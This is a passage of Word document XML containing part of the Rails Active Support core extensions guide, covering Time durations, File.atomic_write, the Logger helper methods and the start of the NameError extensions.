          <w:p w14:paraId="0DB9E3F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun Aug 15 00:00:00 UTC 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16CAFAB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Both </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>local_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accept up to seven positional arguments: year, month, day, hour, min, sec, usec. Year is mandatory, month and day default to 1, and the rest default to 0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040155C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the time to be constructed lies beyond the range supported by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the runtime platform, usecs are discarded and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object is returned instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4243E96A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>17.2.1 Durations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425E5D9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Durations can be added to and subtracted from time objects:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="36C17AF5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3939AB79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = Time.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74740237" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 23:20:05 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21860034" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now + 1.year</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC2870F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#  =&gt; Tue, 09 Aug 2011 23:21:11 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DC41ED2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now - 1.week</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27DF25FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 02 Aug 2010 23:21:11 UTC +00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3796E23F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They translate to calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t>. For example here we get the correct jump in the calendar reform:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4AFDE832" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32724B2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.utc_time(1582, 10, 3) + 5.days</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65BAD157" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon Oct 18 00:00:00 UTC 1582</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="09C1AE18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">18 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>File</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66407FB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">18.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>atomic_write</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5370AE1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With the class method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>File.atomic_write</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you can write to a file in a way that will prevent any reader from seeing half-written content.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D409BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The name of the file is passed as an argument, and the method yields a file handle opened for writing. Once the block is done </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>atomic_write</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> closes the file handle and completes its job.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75867FE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, Action Pack uses this method to write asset cache files like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all.css</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6FEFD2D3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43E4F457" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>File.atomic_write(joined_asset_path) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|cache|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="417E9588" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  cache.write(join_asset_file_contents(asset_paths))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="303B59C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E77D6F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To accomplish this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>atomic_write</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> creates a temporary file. That’s the file the code in the block actually writes to. On completion, the temporary file is renamed, which is an atomic operation on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POSIX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> systems. If the target file exists </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>atomic_write</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> overwrites it and keeps owners and permissions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367DEA24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note you can’t append with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>atomic_write</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178C33F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The auxiliary file is written in a standard directory for temporary files, but you can pass a directory of your choice as second argument.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B1FF6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/file/atomic.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA0754D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">19 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C0E51D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">19.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>around_[level]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682250B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Takes two arguments, a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and calls the current level method on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance, passing in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the specified message, then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_message</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F6229FC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="077F6BC1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger = Logger.new("log/development.log")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E557479" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.around_info("before", "after") { |logger| logger.info("during") }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23F19532" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">19.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F56154" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Silences every log level lesser to the specified one for the duration of the given block. Log level orders are: debug, info, error and fatal.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6F075867" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31A395E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger = Logger.new("log/development.log")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BBA9635" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.silence(Logger::INFO) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7021608B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  logger.debug("In space, no one can hear you scream.")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B81A6E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  logger.info("Scream all you want, small mailman!")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47ED2092" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07D75FAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">19.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>datetime_format=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7E5E37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Modifies the datetime format output by the formatter class associated with this logger. If the formatter class does not have a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>datetime_format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method then this is ignored.</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EC10020" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46F1532D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Logger::FormatWithTime &lt; Logger::Formatter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3310AE1B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  cattr_accessor(:datetime_format) { "%Y%m%d%H%m%S"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21F40399" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="293ACA7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.call(severity, timestamp, progname, msg)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F77094E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    "#{timestamp.strftime(datetime_format)} -- #{String === msg ? msg : msg.inspect}\n"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24ACE4C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17D09DC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="394190B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2359A9E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger = Logger.new("log/development.log")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41D6D7B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.formatter = Logger::FormatWithTime</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A1E12B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>logger.info("&lt;- is the current time")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D2E98F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/logger.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAE8D80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">20 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NameError</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56773EA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support adds </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>missing_name?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NameError</w:t>
      </w:r>
      <w:r>
        <w:t>, which tests whether the exception was raised because of the name passed as argument.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AAFCEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
